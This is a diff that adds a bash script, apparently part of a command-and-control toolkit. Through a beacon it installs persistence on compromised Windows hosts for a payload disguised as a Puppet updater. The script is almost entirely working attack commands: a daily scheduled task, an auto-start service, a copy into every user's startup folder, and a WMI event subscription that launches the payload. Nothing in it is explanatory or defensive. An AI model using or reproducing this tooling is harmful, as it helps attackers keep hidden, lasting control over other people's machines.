@@ -1,0 +1,59 @@
+#!/bin/bash
+# c2-persistence - Deploy persistence via beacon
+# Usage: c2-persistence <beacon_id> <method>
+#   method: schtask | service | startup | wmi | all
+C2="$(dirname "$0")/c2"
+BEACON="$1"
+METHOD="${2:-schtask}"
+
+[ -z "$BEACON" ] && { echo "Usage: c2-persistence <beacon_id> <method>"; exit 1; }
+
+$C2 use "$BEACON" >/dev/null 2>&1
+
+PAYLOAD="C:\\programdata\\puppet\\puppet-update.exe"
+C2_NAME="PuppetUpdater"
+
+echo "=== PERSISTENCE ==="
+
+case "$METHOD" in
+    schtask|all)
+        echo "[*] Method: Scheduled Task (daily)"
+        $C2 task "schtasks /create /sc daily /tn '$C2_NAME' /tr '$PAYLOAD' /f"
+        sleep 5
+        $C2 task "schtasks /run /tn '$C2_NAME'"
+        echo "    schtask created: $C2_NAME -> $PAYLOAD"
+        ;;
+esac
+
+case "$METHOD" in
+    service|all)
+        echo "[*] Method: Service"
+        $C2 task "sc create '$C2_NAME' binpath= '$PAYLOAD' start= auto"
+        sleep 3
+        $C2 task "sc start '$C2_NAME'"
+        echo "    service created: $C2_NAME"
+        ;;
+esac
+
+case "$METHOD" in
+    startup|all)
+        echo "[*] Method: Startup Folder"
+        $C2 task "copy '$PAYLOAD' 'C:\\Users\\*\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\'"
+        echo "    payload copied to user startup folders"
+        ;;
+esac
+
+case "$METHOD" in
+    wmi|all)
+        echo "[*] Method: WMI Event Subscription"
+        $C2 task "wmic /namespace:\\\\root\\subscription PATH __EventFilter CREATE Name='$C2_NAME', EventNameSpace='root\\cimv2', QueryLanguage='WQL', Query=\"SELECT * FROM __InstanceModificationEvent WITHIN 3600 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'\""
+        sleep 3
+        $C2 task "wmic /namespace:\\\\root\\subscription PATH CommandLineEventConsumer CREATE Name='$C2_NAME', CommandLineTemplate='$PAYLOAD'"
+        echo "    WMI event subscription created"
+        ;;
+esac
+
+echo ""
+echo "[*] Persistence deployed via $METHOD methods."
+echo "[*] Verify with: c2 task 'schtasks /query | findstr $C2_NAME'"
+echo "              c2 task 'sc query $C2_NAME'"
